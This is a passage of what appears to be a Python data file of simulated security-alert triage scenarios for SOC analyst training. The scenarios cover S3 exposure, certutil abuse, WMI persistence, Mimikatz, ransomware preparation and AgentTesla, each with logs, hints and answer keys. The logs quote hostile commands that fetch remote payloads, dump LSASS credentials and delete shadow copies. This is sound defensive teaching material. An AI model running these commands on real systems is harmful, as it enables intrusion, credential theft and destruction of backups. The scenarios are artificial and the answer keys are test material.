        {"log_type": "web", "timestamp": "2024-12-15 17:30:00", "source_ip": "10.10.2.33", "dest_ip": "142.250.185.78", "username": "c.martinez", "event_id": "DLP-CRITICAL", "raw_log": "Netskope CASB | DLP VIOLATION | User: c.martinez@corp.com | App: Google Drive (Personal) | Action: UPLOAD | Files: 847 files | Size: 4.2 GB | Policy: NO-PERSONAL-CLOUD | Sensitive content: Payroll_2024.xlsx, Salary_bands.xlsx, Employee_PII.xlsx | Action: ALLOW (warning only)", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 17:30:00", "source_ip": "10.10.2.33", "dest_ip": "142.250.185.78", "username": "c.martinez", "event_id": "DLP-CRITICAL", "raw_log": "CASB | File Categories: HR/Payroll (340 files), Finance/Budget (287 files), M&A Confidential (220 files) | Destination: drive.google.com [PERSONAL - not corporate workspace] | Duration: 47 minutes upload", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 17:00:00", "source_ip": "10.10.2.33", "dest_ip": "", "username": "c.martinez", "event_id": "4663", "raw_log": "EventID: 4663 | File Access | User: c.martinez | Files accessed: \\\\fileserver\\HR\\Payroll\\*, \\\\fileserver\\Finance\\* | Access type: ReadData | Count: 847 files in 20 minutes | BULK FILE ACCESS ANOMALY", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "domain", "value": "drive.google.com", "description": "Personal Google Drive - policy violation destination", "malicious": 0},
        {"ioc_type": "filename", "value": "Payroll_2024.xlsx", "description": "Sensitive payroll data exfiltrated", "malicious": 0},
        {"ioc_type": "filename", "value": "Employee_PII.xlsx", "description": "Employee PII data exfiltrated", "malicious": 0},
    ],
    "timeline": [
        {"event_time": "2024-12-15 17:00:00", "event_type": "Bulk File Access", "description": "c.martinez accesses 847 files from HR and Finance shares", "source": "Windows Security", "severity": "high"},
        {"event_time": "2024-12-15 17:30:00", "event_type": "Cloud Upload", "description": "4.2GB upload to personal Google Drive begins", "source": "Netskope CASB", "severity": "critical"},
        {"event_time": "2024-12-15 18:17:00", "event_type": "Upload Complete", "description": "All 847 files uploaded to personal cloud storage", "source": "CASB", "severity": "critical"},
    ]
},

# ════════════════════════════════════════
# CLOUD SECURITY (15 scenarios)
# ════════════════════════════════════════

{
    "title": "AWS S3 Bucket Misconfiguration - Public Exposure",
    "category": "Cloud Security",
    "severity": "critical",
    "description": "S3 bucket 'corp-customer-backups' accidentally made public. Bucket contains 2.1TB of customer data including PII and payment information. External IP accessed 140,000 files.",
    "source": "AWS CloudTrail / GuardDuty",
    "source_ip": "0.0.0.0",
    "dest_ip": "s3.amazonaws.com",
    "hostname": "AWS-S3-corp-customer-backups",
    "username": "anonymous",
    "expected_verdict": "true_positive",
    "points": 225,
    "hint": "Check who changed the bucket policy to public and when. GuardDuty will show anomalous S3 GetObject API calls from unknown IPs.",
    "solution_explanation": "True positive critical data exposure. S3 bucket made public by misconfigured Terraform deployment. 140,000 files accessed by external IPs. Breach notification required. Immediately revoke public access and rotate any exposed credentials.",
    "host_info": json.dumps({"hostname": "corp-customer-backups.s3.amazonaws.com", "service": "AWS S3", "region": "us-east-1", "data_size": "2.1TB", "public_since": "2024-12-14 03:00 UTC", "files": 140000, "criticality": "Critical"}),
    "user_info": json.dumps({"username": "Anonymous (public access)", "terraform_change_by": "devops_pipeline (service account)", "change_pr": "PR #447 - Storage refactor"}),
    "mitre_mapping": json.dumps({"tactic": "Collection", "technique": "T1530", "name": "Data from Cloud Storage", "url": "https://attack.mitre.org/techniques/T1530/"}),
    "logs": [
        {"log_type": "web", "timestamp": "2024-12-14 03:00:00", "source_ip": "", "dest_ip": "s3.amazonaws.com", "username": "terraform-pipeline", "event_id": "PutBucketPolicy", "raw_log": "AWS CloudTrail | PutBucketPolicy | Bucket: corp-customer-backups | Principal: * (Public) | Action: s3:GetObject | Effect: Allow | Caller: arn:aws:iam::123456789:role/DevOps-Pipeline | Source: Terraform apply (PR #447)", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-14 03:45:22", "source_ip": "45.148.10.200", "dest_ip": "s3.amazonaws.com", "username": "anonymous", "event_id": "GetObject", "raw_log": "AWS CloudTrail | GetObject | Bucket: corp-customer-backups | Key: backups/customers/2024-Q4.tar.gz | UserAgent: python-boto3/1.28 | Source IP: 45.148.10.200 | AUTH: None (Public) | FIRST EXTERNAL ACCESS", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 08:00:00", "source_ip": "", "dest_ip": "s3.amazonaws.com", "username": "", "event_id": "GuardDuty", "raw_log": "AWS GuardDuty | HIGH | S3/BucketBlockPublicAccessDisabled | Bucket: corp-customer-backups | External IPs accessed: 23 unique IPs | Files downloaded: 140,000 | Data transferred: 47GB | Finding confidence: HIGH", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "45.148.10.200", "description": "First external IP to access exposed S3 bucket", "malicious": 1},
        {"ioc_type": "url", "value": "s3://corp-customer-backups", "description": "Misconfigured public S3 bucket", "malicious": 0},
    ],
    "timeline": [
        {"event_time": "2024-12-14 03:00:00", "event_type": "Misconfiguration", "description": "Terraform PR #447 makes S3 bucket publicly accessible", "source": "CloudTrail", "severity": "critical"},
        {"event_time": "2024-12-14 03:45:22", "event_type": "First Access", "description": "External IP downloads customer backup archive", "source": "CloudTrail", "severity": "critical"},
        {"event_time": "2024-12-15 08:00:00", "event_type": "GuardDuty Alert", "description": "GuardDuty detects 23 IPs accessed 140,000 files over 29 hours", "source": "GuardDuty", "severity": "critical"},
    ]
},

# ════════════════════════════════════════
# ENDPOINT SECURITY (15 scenarios)
# ════════════════════════════════════════

{
    "title": "Living off the Land - Certutil Payload Download",
    "category": "Endpoint Security",
    "severity": "high",
    "description": "certutil.exe used to download and decode a payload from external URL. Certutil is a Windows built-in tool commonly abused for malware delivery to bypass application whitelisting.",
    "source": "Windows Event Log / EDR",
    "source_ip": "10.10.1.75",
    "dest_ip": "104.18.22.33",
    "hostname": "WKSTN-LEGAL01",
    "username": "r.chen",
    "expected_verdict": "true_positive",
    "points": 150,
    "hint": "Certutil.exe is a LOLBin (Living off the Land Binary). Its use for downloading files (-urlcache -f) or decoding base64 is a strong malware indicator.",
    "solution_explanation": "True positive LOLBin abuse. certutil.exe downloading and decoding a remote payload is a classic malware staging technique. Isolate host and analyze downloaded payload.",
    "host_info": json.dumps({"hostname": "WKSTN-LEGAL01", "os": "Windows 10 Pro", "ip": "10.10.1.75", "criticality": "Medium"}),
    "user_info": json.dumps({"username": "r.chen", "department": "Legal", "it_skills": "Basic", "note": "Not expected to use certutil"}),
    "mitre_mapping": json.dumps({"tactic": "Defense Evasion", "technique": "T1218.001", "name": "System Binary Proxy Execution: Certutil", "url": "https://attack.mitre.org/techniques/T1218/001/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 13:45:00", "source_ip": "10.10.1.75", "dest_ip": "104.18.22.33", "username": "r.chen", "event_id": "4688", "raw_log": "EventID: 4688 | New Process | certutil.exe | CommandLine: certutil.exe -urlcache -f http://104.18.22.33/payload.b64 C:\\Windows\\Temp\\update.b64 | Parent: cmd.exe | User: r.chen | LOLBIN ABUSE: certutil downloading remote file", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 13:45:05", "source_ip": "10.10.1.75", "dest_ip": "", "username": "r.chen", "event_id": "4688", "raw_log": "EventID: 4688 | New Process | certutil.exe | CommandLine: certutil.exe -decode C:\\Windows\\Temp\\update.b64 C:\\Windows\\Temp\\svchost.exe | BASE64 DECODE: payload decoded to executable", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 13:45:08", "source_ip": "10.10.1.75", "dest_ip": "", "username": "r.chen", "event_id": "4688", "raw_log": "EventID: 4688 | New Process | svchost.exe | Path: C:\\Windows\\Temp\\svchost.exe (NOT system svchost) | Parent: cmd.exe | UNSIGNED BINARY | AV DETECTION: Backdoor.Trojan", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "104.18.22.33", "description": "Malware download server", "malicious": 1},
        {"ioc_type": "url", "value": "http://104.18.22.33/payload.b64", "description": "Base64 encoded malware payload URL", "malicious": 1},
        {"ioc_type": "filename", "value": "C:\\Windows\\Temp\\svchost.exe", "description": "Malware disguised as svchost in Temp folder", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 13:45:00", "event_type": "Download", "description": "certutil downloads base64 payload from external IP", "source": "Event Log", "severity": "high"},
        {"event_time": "2024-12-15 13:45:05", "event_type": "Decode", "description": "Base64 payload decoded to executable", "source": "Event Log", "severity": "high"},
        {"event_time": "2024-12-15 13:45:08", "event_type": "Execution", "description": "Decoded malware executed from Temp folder", "source": "EDR", "severity": "critical"},
    ]
},

# ════════════════════════════════════════
# THREAT HUNTING (15 scenarios)
# ════════════════════════════════════════

{
    "title": "Threat Hunt - Suspicious WMI Persistence",
    "category": "Threat Hunting",
    "severity": "high",
    "description": "Proactive threat hunt discovered WMI event subscription used for persistence. Subscription triggers on system startup and executes PowerShell payload. No AV alerts triggered.",
    "source": "Velociraptor / osquery",
    "source_ip": "10.10.3.55",
    "dest_ip": "",
    "hostname": "WKSTN-EXEC01",
    "username": "e.ford",
    "expected_verdict": "true_positive",
    "points": 225,
    "hint": "WMI persistence uses __EventFilter + __EventConsumer + __FilterToConsumerBinding. Check for CommandLineEventConsumer with suspicious PowerShell.",
    "solution_explanation": "True positive WMI persistence. Threat hunt using Velociraptor revealed malicious WMI event subscription running PowerShell on every startup. Host likely compromised, possibly as part of larger APT campaign.",
    "host_info": json.dumps({"hostname": "WKSTN-EXEC01", "os": "Windows 10 Pro", "ip": "10.10.3.55", "user_role": "C-Level Executive", "criticality": "Critical", "hunt_query": "SELECT * FROM root/subscription:__FilterToConsumerBinding"}),
    "user_info": json.dumps({"username": "e.ford", "department": "Executive", "title": "CFO", "data_access": "All financial systems"}),
    "mitre_mapping": json.dumps({"tactic": "Persistence", "technique": "T1546.003", "name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription", "url": "https://attack.mitre.org/techniques/T1546/003/"}),
    "logs": [
        {"log_type": "edr", "timestamp": "2024-12-15 09:00:00", "source_ip": "10.10.3.55", "dest_ip": "", "username": "e.ford", "event_id": "HUNT-RESULT", "raw_log": "Velociraptor Hunt | WKSTN-EXEC01 | WMI Subscription Found | Filter: SystemStartup_Monitor | Consumer: CommandLineEventConsumer | Command: powershell -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwADQALgAxADgALgAyADIALgAzADMALwBzAHQAYQBnAGUAMgAnACkA | Created: 2024-12-10", "highlighted": 1},
        {"log_type": "edr", "timestamp": "2024-12-15 09:01:00", "source_ip": "10.10.3.55", "dest_ip": "", "username": "", "event_id": "HUNT-DECODE", "raw_log": "Decoded PowerShell: IEX (New-Object Net.WebClient).DownloadString('http://104.18.22.33/stage2') | STAGE 2 PAYLOAD DOWNLOAD ON EVERY REBOOT | C2 Server: 104.18.22.33 | Persistence since: 2024-12-10", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-10 14:22:00", "source_ip": "10.10.3.55", "dest_ip": "", "username": "e.ford", "event_id": "5861", "raw_log": "EventID: 5861 | WMI Activity | New WMI event subscription | Name: SystemStartup_Monitor | Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' | INITIAL CREATION 5 DAYS AGO", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "104.18.22.33", "description": "C2 server in WMI persistence payload", "malicious": 1},
        {"ioc_type": "domain", "value": "SystemStartup_Monitor", "description": "Malicious WMI event subscription name", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-10 14:22:00", "event_type": "Persistence Established", "description": "Malicious WMI subscription created 5 days ago", "source": "Windows Event Log", "severity": "critical"},
        {"event_time": "2024-12-15 09:00:00", "event_type": "Hunt Discovery", "description": "Threat hunt via Velociraptor discovers WMI persistence", "source": "Velociraptor", "severity": "critical"},
        {"event_time": "2024-12-15 09:01:00", "event_type": "Payload Decoded", "description": "Encoded PowerShell decoded - stage2 download on every reboot", "source": "Hunt Analysis", "severity": "critical"},
    ]
},

# ════════════════════════════════════════
# MORE SCENARIOS - FILLING TO 50+
# ════════════════════════════════════════

{
    "title": "Mimikatz Execution - LSASS Credential Dump",
    "category": "Endpoint Security",
    "severity": "critical",
    "description": "Mimikatz executed directly on domain controller. LSASS process memory read detected. All domain credentials potentially compromised.",
    "source": "Windows Defender / EDR",
    "source_ip": "10.10.0.5",
    "dest_ip": "",
    "hostname": "DC01",
    "username": "domain_admin",
    "expected_verdict": "true_positive",
    "points": 250,
    "hint": "Mimikatz signature: sekurlsa::logonpasswords command. Process: lsass.exe memory read by non-system process.",
    "solution_explanation": "True positive Mimikatz execution on DC. Treat as full domain compromise - reset all privileged credentials, KRBTGT twice, and initiate IR.",
    "host_info": json.dumps({"hostname": "DC01", "os": "Windows Server 2022", "ip": "10.10.0.5", "role": "Primary Domain Controller", "criticality": "Critical"}),
    "user_info": json.dumps({"username": "domain_admin", "privileges": "Domain Admin", "anomaly": "Interactive logon to DC unusual"}),
    "mitre_mapping": json.dumps({"tactic": "Credential Access", "technique": "T1003.001", "name": "OS Credential Dumping: LSASS Memory", "url": "https://attack.mitre.org/techniques/T1003/001/"}),
    "logs": [
        {"log_type": "edr", "timestamp": "2024-12-15 20:10:00", "source_ip": "10.10.0.5", "dest_ip": "", "username": "domain_admin", "event_id": "EDR-CRITICAL", "raw_log": "Windows Defender ATP | ALERT | Credential Access | mimikatz.exe | Command: privilege::debug; sekurlsa::logonpasswords | LSASS handle obtained | Plaintext passwords extracted | DC01 | ALL DOMAIN CREDENTIALS AT RISK", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 20:09:58", "source_ip": "10.10.0.5", "dest_ip": "", "username": "domain_admin", "event_id": "4688", "raw_log": "EventID: 4688 | mimikatz.exe | Path: C:\\Users\\domain_admin\\Desktop\\mimikatz.exe | Parent: cmd.exe | Interactive session on DC - extremely unusual", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 20:10:05", "source_ip": "10.10.0.5", "dest_ip": "", "username": "SYSTEM", "event_id": "4656", "raw_log": "EventID: 4656 | Handle to lsass.exe requested | Access: PROCESS_VM_READ | Requesting process: mimikatz.exe | CREDENTIAL DUMPING", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "filename", "value": "mimikatz.exe", "description": "Mimikatz credential dumping tool", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 20:09:58", "event_type": "Execution", "description": "Mimikatz launched interactively on DC01", "source": "Event Log", "severity": "critical"},
        {"event_time": "2024-12-15 20:10:00", "event_type": "LSASS Dump", "description": "LSASS memory read - all credentials extracted", "source": "EDR", "severity": "critical"},
    ]
},

{
    "title": "Suspicious Login - Impossible Travel",
    "category": "Authentication Attacks",
    "severity": "high",
    "description": "User logged in from New York at 9:00 AM, then from Singapore at 9:45 AM. Physical travel between these locations in 45 minutes is impossible - account likely compromised.",
    "source": "Azure AD Conditional Access / UEBA",
    "source_ip": "203.0.113.100",
    "dest_ip": "52.96.0.0",
    "hostname": "M365-CLOUD",
    "username": "b.taylor",
    "expected_verdict": "true_positive",
    "points": 150,
    "hint": "Impossible travel = same user authenticated from geographically impossible locations in short timeframe. Check if VPN could explain it.",
    "solution_explanation": "True positive impossible travel. b.taylor has no VPN policy allowing Singapore locations. Account compromise confirmed. Disable account and initiate password reset with MFA re-enrollment.",
    "host_info": json.dumps({"hostname": "Azure AD / M365", "service": "Cloud Identity", "vpn_allowed_locations": ["US", "UK", "CA"], "criticality": "High"}),
    "user_info": json.dumps({"username": "b.taylor", "department": "Marketing", "normal_location": "New York, USA", "vpn_usage": False, "travel_calendar": "No travel scheduled"}),
    "mitre_mapping": json.dumps({"tactic": "Initial Access", "technique": "T1078", "name": "Valid Accounts", "url": "https://attack.mitre.org/techniques/T1078/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 09:00:00", "source_ip": "72.21.198.64", "dest_ip": "52.96.0.0", "username": "b.taylor", "event_id": "4624", "raw_log": "Azure AD | SIGNIN | User: b.taylor@corp.com | IP: 72.21.198.64 | Location: New York, USA | App: Outlook | MFA: Success | Risk: None", "highlighted": 0},
        {"log_type": "windows_event", "timestamp": "2024-12-15 09:45:00", "source_ip": "203.0.113.100", "dest_ip": "52.96.0.0", "username": "b.taylor", "event_id": "4624", "raw_log": "Azure AD | SIGNIN | User: b.taylor@corp.com | IP: 203.0.113.100 | Location: Singapore, SG | App: SharePoint | MFA: SUCCESS (TOTP) | IMPOSSIBLE TRAVEL ALERT | Distance: 15,340km in 45 min", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 09:46:00", "source_ip": "203.0.113.100", "dest_ip": "52.96.0.0", "username": "b.taylor", "event_id": "UEBA", "raw_log": "Microsoft Sentinel UEBA | IMPOSSIBLE TRAVEL | b.taylor | NY -> Singapore | 45 minutes | Velocity: 20,453 km/h (impossible) | MFA passed but location anomalous | RISK SCORE: 95/100", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "203.0.113.100", "description": "Singapore IP - b.taylor impossible travel source", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 09:00:00", "event_type": "Normal Login", "description": "b.taylor logs in from New York - expected behavior", "source": "Azure AD", "severity": "info"},
        {"event_time": "2024-12-15 09:45:00", "event_type": "Impossible Travel", "description": "Same user authenticates from Singapore 45 minutes later", "source": "Azure AD", "severity": "critical"},
        {"event_time": "2024-12-15 09:46:00", "event_type": "UEBA Alert", "description": "Sentinel UEBA flags impossible travel - risk score 95/100", "source": "Sentinel", "severity": "critical"},
    ]
},

{
    "title": "Scheduled Task Persistence - Malware Installer",
    "category": "Endpoint Security",
    "severity": "high",
    "description": "Suspicious scheduled task 'WindowsUpdateCheck' created to run malware every hour. Task created by non-admin user using schtasks.exe with encoded PowerShell payload.",
    "source": "Windows Event Log / EDR",
    "source_ip": "10.10.1.90",
    "dest_ip": "",
    "hostname": "WKSTN-MKT02",
    "username": "s.kim",
    "expected_verdict": "true_positive",
    "points": 150,
    "hint": "Event ID 4698 - scheduled task creation. Check task name (masquerades as legit), frequency, and payload. Non-admin creating system tasks is suspicious.",
    "solution_explanation": "True positive malware persistence via scheduled task. Task disguised as Windows Update check but runs attacker payload hourly. Remove task, isolate host, investigate infection vector.",
    "host_info": json.dumps({"hostname": "WKSTN-MKT02", "os": "Windows 10", "ip": "10.10.1.90", "criticality": "Low"}),
    "user_info": json.dumps({"username": "s.kim", "department": "Marketing", "admin_rights": False, "anomaly": "Non-admin created system scheduled task"}),
    "mitre_mapping": json.dumps({"tactic": "Persistence", "technique": "T1053.005", "name": "Scheduled Task/Job: Scheduled Task", "url": "https://attack.mitre.org/techniques/T1053/005/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 14:00:00", "source_ip": "10.10.1.90", "dest_ip": "", "username": "s.kim", "event_id": "4698", "raw_log": "EventID: 4698 | Scheduled Task Created | Task Name: \\Microsoft\\Windows\\WindowsUpdateCheck | Run As: SYSTEM | Trigger: Every 1 Hour | Action: powershell.exe -WindowStyle Hidden -EncodedCommand cwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQA= | Created By: CORP\\s.kim (non-admin)", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "filename", "value": "WindowsUpdateCheck (schtask)", "description": "Malicious scheduled task mimicking Windows Update", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 14:00:00", "event_type": "Persistence", "description": "Malicious scheduled task created as SYSTEM by non-admin user", "source": "Event Log", "severity": "high"},
    ]
},

{
    "title": "Ransomware Preparation - Shadow Copy Deletion",
    "category": "Malware",
    "severity": "critical",
    "description": "vssadmin.exe used to delete all volume shadow copies across multiple hosts. This is a pre-encryption step in ransomware attacks, indicating imminent deployment.",
    "source": "Windows Event Log / SIEM Correlation",
    "source_ip": "10.10.0.50",
    "dest_ip": "",
    "hostname": "Multiple Hosts",
    "username": "SYSTEM",
    "expected_verdict": "true_positive",
    "points": 225,
    "hint": "Shadow copy deletion (vssadmin delete shadows /all) across multiple hosts simultaneously is a ransomware indicator. Act immediately.",
    "solution_explanation": "True positive pre-ransomware activity. Shadow copy deletion across 12 hosts detected. Ransomware deployment likely imminent or in progress. Isolate network segment immediately.",
    "host_info": json.dumps({"hostname": "12 hosts affected", "affected": ["WKSTN-*", "FILESERVER01", "SQLSERVER01"], "criticality": "Critical"}),
    "user_info": json.dumps({"username": "SYSTEM (via PsExec)", "note": "Attacker using SYSTEM context to delete shadow copies across network"}),
    "mitre_mapping": json.dumps({"tactic": "Impact", "technique": "T1490", "name": "Inhibit System Recovery", "url": "https://attack.mitre.org/techniques/T1490/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 23:55:00", "source_ip": "10.10.0.50", "dest_ip": "", "username": "SYSTEM", "event_id": "4688", "raw_log": "EventID: 4688 | vssadmin.exe delete shadows /all /quiet | WKSTN-ACCT01 | Via PsExec from 10.10.0.50 | Shadow copies deleted", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 23:55:02", "source_ip": "10.10.0.50", "dest_ip": "", "username": "SYSTEM", "event_id": "4688", "raw_log": "EventID: 4688 | vssadmin.exe delete shadows /all /quiet | WKSTN-ACCT02 | CORRELATED: Same command on 12 hosts in 90 seconds | RANSOMWARE PRE-ENCRYPTION", "highlighted": 1},
        {"log_type": "edr", "timestamp": "2024-12-15 23:55:00", "source_ip": "", "dest_ip": "", "username": "", "event_id": "SIEM-CRITICAL", "raw_log": "SIEM CORRELATION | Rule: Ransomware_Prep | vssadmin delete shadows on 12+ hosts within 2 minutes | Hosts: WKSTN-ACCT01 through WKSTN-ACCT12 | RANSOMWARE DEPLOYMENT IMMINENT | ISOLATE NETWORK NOW", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "10.10.0.50", "description": "Ransomware operator pivot host - distributing vssadmin commands", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 23:55:00", "event_type": "Shadow Delete Wave", "description": "Coordinated shadow copy deletion across 12 hosts via PsExec", "source": "SIEM", "severity": "critical"},
        {"event_time": "2024-12-15 23:56:30", "event_type": "Ransomware Imminent", "description": "All recovery points deleted - encryption expected next", "source": "SIEM Correlation", "severity": "critical"},
    ]
},

{
    "title": "Suspicious Service Installation - Kernel Driver",
    "category": "Endpoint Security",
    "severity": "high",
    "description": "Unknown kernel driver installed on endpoint. Driver not signed by Microsoft or known vendor. Rootkit behavior suspected - driver hiding processes and files.",
    "source": "Windows Event Log / EDR",
    "source_ip": "10.10.2.77",
    "dest_ip": "",
    "hostname": "WKSTN-IT01",
    "username": "it_helpdesk",
    "expected_verdict": "true_positive",
    "points": 200,
    "hint": "Event ID 7045 - new service installed. Check driver signature (should be Microsoft or OEM). Unsigned kernel drivers are rootkit indicators.",
    "solution_explanation": "True positive rootkit installation. Unsigned kernel driver with process/file hiding capabilities indicates advanced persistent threat. Full forensic analysis required.",
    "host_info": json.dumps({"hostname": "WKSTN-IT01", "os": "Windows 10 Pro", "ip": "10.10.2.77", "criticality": "Medium"}),
    "user_info": json.dumps({"username": "it_helpdesk", "department": "IT Support", "admin_rights": True}),
    "mitre_mapping": json.dumps({"tactic": "Defense Evasion", "technique": "T1014", "name": "Rootkit", "url": "https://attack.mitre.org/techniques/T1014/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 11:30:00", "source_ip": "10.10.2.77", "dest_ip": "", "username": "it_helpdesk", "event_id": "7045", "raw_log": "EventID: 7045 | New Service Installed | Service Name: WinSys32Helper | Display: Windows System Helper | Type: Kernel Driver | Start: Auto | Path: C:\\Windows\\System32\\drivers\\winsys32.sys | Signature: UNSIGNED | ROOTKIT INDICATOR", "highlighted": 1},
        {"log_type": "edr", "timestamp": "2024-12-15 11:30:05", "source_ip": "10.10.2.77", "dest_ip": "", "username": "it_helpdesk", "event_id": "EDR-HIGH", "raw_log": "CrowdStrike | DETECT | Rootkit | winsys32.sys | Behaviors: Process hiding, File hiding, Network connection hiding | Hook: SSDT hooks detected | SHA256: deadbeef1234567890abcdef | UNSIGNED DRIVER", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "filename", "value": "winsys32.sys", "description": "Unsigned rootkit kernel driver", "malicious": 1},
        {"ioc_type": "hash", "value": "deadbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678", "description": "Rootkit driver SHA256", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 11:30:00", "event_type": "Driver Install", "description": "Unsigned kernel driver installed as auto-start service", "source": "Event Log", "severity": "critical"},
        {"event_time": "2024-12-15 11:30:05", "event_type": "Rootkit Detected", "description": "EDR detects SSDT hooks and process/file hiding behavior", "source": "EDR", "severity": "critical"},
    ]
},

{
    "title": "Phishing - Typosquatting Domain Redirect",
    "category": "Phishing",
    "severity": "medium",
    "description": "Employee navigated to 'arnazon.com' instead of 'amazon.com' and entered credentials. Typosquatting site captured login information.",
    "source": "Proxy / DNS Logs",
    "source_ip": "10.10.4.22",
    "dest_ip": "45.33.100.55",
    "hostname": "WKSTN-FIN02",
    "username": "d.wilson",
    "expected_verdict": "false_positive",
    "points": 75,
    "hint": "This is a personal account credential entry (Amazon shopping), not corporate credentials. Check what site was actually visited and what credentials were entered.",
    "solution_explanation": "False positive from corporate perspective - user entered personal Amazon credentials, not corporate credentials. No corporate data at risk. User education recommended but no incident required.",
    "host_info": json.dumps({"hostname": "WKSTN-FIN02", "os": "Windows 10", "ip": "10.10.4.22", "criticality": "Low"}),
    "user_info": json.dumps({"username": "d.wilson", "department": "Finance", "statement": "Was shopping on Amazon during lunch break, typed URL wrong"}),
    "mitre_mapping": json.dumps({"tactic": "Initial Access", "technique": "T1566.003", "name": "Phishing: Spear phishing via Service", "url": "https://attack.mitre.org/techniques/T1566/003/"}),
    "logs": [
        {"log_type": "web", "timestamp": "2024-12-15 12:30:00", "source_ip": "10.10.4.22", "dest_ip": "45.33.100.55", "username": "d.wilson", "event_id": "PROXY", "raw_log": "Proxy | ALLOW | 10.10.4.22 | GET https://arnazon.com/ | Category: Shopping (Uncategorized) | SSL: Yes | User: d.wilson | TYPOSQUAT WARNING: arnazon.com vs amazon.com", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 12:30:45", "source_ip": "10.10.4.22", "dest_ip": "45.33.100.55", "username": "d.wilson", "event_id": "PROXY", "raw_log": "Proxy | POST https://arnazon.com/login | Body contains: email, password fields | PERSONAL AMAZON CREDENTIALS likely entered | No corporate credential match in POST body", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "domain", "value": "arnazon.com", "description": "Amazon typosquatting domain", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 12:30:00", "event_type": "Typosquat Visit", "description": "User typed arnazon.com instead of amazon.com during lunch", "source": "Proxy", "severity": "medium"},
        {"event_time": "2024-12-15 12:30:45", "event_type": "Credential Entry", "description": "Personal Amazon credentials entered on phishing site", "source": "Proxy", "severity": "medium"},
    ]
},

{
    "title": "Malware - AgentTesla Keylogger",
    "category": "Malware",
    "severity": "high",
    "description": "AgentTesla info-stealer detected on accounting workstation. Keylogger capturing credentials and exfiltrating via SMTP to threat actor email. Banking site credentials at risk.",
    "source": "CrowdStrike EDR",
    "source_ip": "10.10.2.88",
    "dest_ip": "smtp.aol.com",
    "hostname": "WKSTN-ACCT03",
    "username": "f.garcia",
    "expected_verdict": "true_positive",
    "points": 175,
    "hint": "AgentTesla uses SMTP/FTP to exfiltrate stolen data. Look for outbound SMTP to personal mail services from corporate workstations.",
    "solution_explanation": "True positive AgentTesla infection. Keylogger harvesting credentials and exfiltrating via email to attacker. Isolate immediately, reset all credentials entered on this host.",
    "host_info": json.dumps({"hostname": "WKSTN-ACCT03", "os": "Windows 10", "ip": "10.10.2.88", "criticality": "High", "data_at_risk": "Banking credentials, corporate logins, email credentials"}),
    "user_info": json.dumps({"username": "f.garcia", "department": "Accounting", "banking_access": True}),
    "mitre_mapping": json.dumps({"tactic": "Collection", "technique": "T1056.001", "name": "Input Capture: Keylogging", "url": "https://attack.mitre.org/techniques/T1056/001/"}),
    "logs": [
        {"log_type": "edr", "timestamp": "2024-12-15 10:00:00", "source_ip": "10.10.2.88", "dest_ip": "", "username": "f.garcia", "event_id": "EDR-HIGH", "raw_log": "CrowdStrike | DETECT | Infostealer | Process: WindowsUpdate32.exe | Behaviors: Keylogger hook (SetWindowsHookExW), Clipboard monitor, Form grabbing, Browser credential theft | Family: AgentTesla | Source: Email attachment (Invoice.exe)", "highlighted": 1},
        {"log_type": "firewall", "timestamp": "2024-12-15 10:05:00", "source_ip": "10.10.2.88", "dest_ip": "64.12.90.100", "username": "f.garcia", "event_id": "", "raw_log": "FIREWALL | ALLOW | 10.10.2.88:49821 -> smtp.aol.com:587 | SMTP AUTH | From: corp_report@aol.com | To: attacker_recv@protonmail.com | Subject: [LOG] WKSTN-ACCT03 | AgentTesla SMTP exfil", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "filename", "value": "WindowsUpdate32.exe", "description": "AgentTesla disguised as Windows Update", "malicious": 1},
